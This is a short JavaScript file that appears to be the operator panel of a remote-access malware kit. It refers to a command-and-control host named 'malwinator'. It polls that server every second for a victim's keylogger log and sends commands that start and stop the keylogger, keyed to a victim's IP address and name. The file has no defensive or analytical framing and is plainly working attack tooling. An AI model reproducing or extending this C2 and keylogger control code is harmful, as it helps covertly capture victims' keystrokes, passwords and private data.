uri = "http://localhost:5000"
// uri = "https://malwinator.chickenkiller.com"
// uri = "http://malwinator.chickenkiller.com"
function fetchLog() {
    path = "/getLog"
    const paragraph = document.getElementById('log-data');
    const formData = new FormData();
    formData.append("ip", ip);
    formData.append("name", name);

    fetch(uri + path, {
        method: "POST",
        body: formData
    })
        .then(response => {
            return response.text();
        })
        .then(text => {
            paragraph.textContent = text;
        })
        .catch(error => {
            console.error('Error', error);
        })
}

function sendCommand(command) {
    path = "/send"
    const result = document.getElementById('commandResult');
    const formData = new FormData();
    
    formData.append("ip", ip);
    formData.append("name", name);
    formData.append("command", command);

    fetch(uri + path, {
        method: "POST",
        body: formData
    })
        .then(response => {
            return response.text();
        })
        .then(text => {
            if (text == '1')
                result.textContent = "Failed to send command!";
            else 
                if (command == 'log')
                    result.textContent = "Keylogger started!";
                else if (command == 'end-log')
                    result.textContent = "Keylogger ended!";
                else 
                result.textContent = "";

        })
        .catch(error => {
            console.error('Error', error);
        })
}

setInterval(fetchLog, 1000);